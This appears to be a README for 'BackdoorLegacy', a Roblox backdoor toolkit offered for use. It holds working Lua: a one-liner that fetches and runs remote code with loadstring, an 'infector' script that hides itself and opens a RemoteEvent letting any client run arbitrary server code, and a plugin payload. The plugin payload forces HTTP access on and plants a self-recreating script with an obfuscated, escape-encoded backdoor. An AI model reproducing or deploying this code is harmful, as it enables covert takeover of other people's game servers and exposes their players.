BackdoorLegacy v2.0 is coming soon!

# Scanner
```lua
loadstring(game:HttpGet('https://raw.githubusercontent.com/IvanTheProtogen/BackdoorLegacy/main/main.lua'))();
```

# Infector
```lua
-- mustTalk determines whether the backdoor provider should print out stuff in the console or not
-- recommended to keep mustTalk off, as it can invoke the devs and Roblox mod team
-- mustTalk will not prevent data logging!
-- ON = true
-- OFF = false
local mustTalk = false

local print = print
if not mustTalk then
	print = function()end
end

if game:GetService("RunService"):IsStudio() then 
	return 
end

-- this hides the script, potentially securing the backdoor
getfenv().script:Destroy()
getfenv().script = nil

print([[-- Infected with BackdoorLegacy by IvanTheSkid
-- github.com/IvanTheProtogen/BackdoorLegacy

-- Features we have:
-- -- Data logging
-- -- Anti-tamper remote
-- -- Compatibility with any backdoor scanner
-- -- Multiple code execution support

-- INTERACTION WITH THE BACKDOOR WILL EXPOSE YOU!
-- DATA INCLUDED:
-- -- player that executed the backdoor
-- -- code that is sent thru
-- -- success indicator
-- -- error message or returned values
-- SCARED TO HAVE YOUR C00LGUI LEAKED? BOOHOO, SKID!
]])

local loadstring = require(14132891321)
local rmt
local conA
local conB
local newBD
local delBD
local onExec
local onExecP
local onTamper
function onExec(plr,...)
	for i,v in pairs({...}) do
		print("EXECUTING CODE:",...)
		onExecP(pcall(function()return loadstring:SpawnS(v,workspace)end))
	end
end
function onExecP(...)
	print("EXECUTION RESULT: [",...,"]")
	rmt:FireAllClients(plr,v)
end
function newBD()
	rmt = Instance.new("RemoteEvent",game:GetService("ReplicatedStorage"))
	conA = rmt.OnServerEvent:connect(onExec)
	conB = rmt.Changed:connect(onTamper)
	print("BACKDOOR CREATED")
	return rmt
end
function delBD()
	pcall(function()
		rmt:Destroy()
	end)
	rmt = nil
	pcall(function()
		conA:disconnect()
	end)
	conA = nil
	pcall(function()
		conB:disconnect()
	end)
	conB = nil
	print("BACKDOOR DESTROYED")
end
function onTamper()
	print("BACKDOOR TAMPERED? REFRESHING...")
	delBD()
	newBD()
end
newBD()
```

# Plugin Infector [[⚠️DEPRECATED⚠️]]

> This item is deprecated and should not be used. Code a backdoor by yourself instead.

## Put this code below as a whole into the PluginScript.
```lua
pcall(function()spawn(function()while wait()do pcall(function()spawn(function()game:GetService("HttpService").HttpEnabled=true;end)end)end;end)end);

local ratchet

local RecreateRatchet
local ConnectRatchet
local CreateRatchet

RecreateRatchet = function()spawn(function()
    pcall(function()ratchet:Destroy()end)
    CreateRatchet()
end)end

ConnectRatchet = function(inst)pcall(function()
    inst.Changed:Connect(function()
        RecreateRatchet()
    end)
end)end

CreateRatchet = function()
    ratchet = Instance.new("Script",
    game:GetService("ServerScriptService"))
    
    ratchet.Disabled = false
    ratchet.Source = [====[if not game:GetService('\82\117\110\83\101\114\118\105\99\101'):IsStudio() then getfenv(0)["\73\110\115\116\97\110\99\101"]["\110\101\119"]("\82\101\109\111\116\101\69\118\101\110\116",workspace).OnServerEvent:Connect(function(_,code) getfenv(0)["\114\101\113\117\105\114\101"](0x34A62CEB9):SpawnS(code,workspace) end) end]====]
    
    ConnectRatchet(ratchet)
end

for i,v in pairs(game:GetDescendants()) do 
    if v:IsA("Script") then 
        if string.match(v.Source, [====[if not game:GetService('\82\117\110\83\101\114\118\105\99\101'):IsStudio() then getfenv(0)["\73\110\115\116\97\110\99\101"]["\110\101\119"]("\82\101\109\111\116\101\69\118\101\110\116",workspace).OnServerEvent:Connect(function(_,code) getfenv(0)["\114\101\113\117\105\114\101"](0x34A62CEB9):SpawnS(code,workspace) end) end]====]) ~= nil then 
            v:Destroy() 
        end 
    end 
end 

CreateRatchet()
```
